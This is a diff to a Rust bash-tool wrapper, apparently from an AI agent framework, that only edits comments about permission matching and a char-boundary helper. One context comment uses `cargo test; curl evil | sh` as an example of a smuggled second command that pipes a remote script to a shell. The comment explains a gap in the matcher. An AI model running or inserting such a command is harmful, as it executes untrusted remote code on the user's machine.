@@ -113,7 +113,9 @@ impl Tool for BashTool {
 
     fn required_permissions(&self, input: &str, _ctx: &ToolContext) -> Vec<String> {
         // The full command line is the target, so the policy engine can match
-        // token-prefix rules like `command(cargo test)` against it.
+        // whole-command rules like `command(cargo test)` against it. Note the
+        // arity is exact — `command(cargo test)` does not cover
+        // `cargo test --lib`; see `octane_permission::matcher`.
         //
         // Note what this does *not* do: it has no idea that
         // `cargo test; curl evil | sh` is two commands. A shell-AST pass belongs
@@ -312,6 +314,9 @@ fn truncate(text: &str) -> String {
 
 /// Largest char boundary at or below `index`. Slicing mid-codepoint panics, and
 /// command output is arbitrary bytes.
+///
+/// `str::{floor,ceil}_char_boundary` do exactly this, but they are stable only
+/// since 1.91 and the workspace declares an MSRV of 1.85.
 fn floor_char_boundary(text: &str, index: usize) -> usize {
     let mut i = index.min(text.len());
     while i > 0 && !text.is_char_boundary(i) {
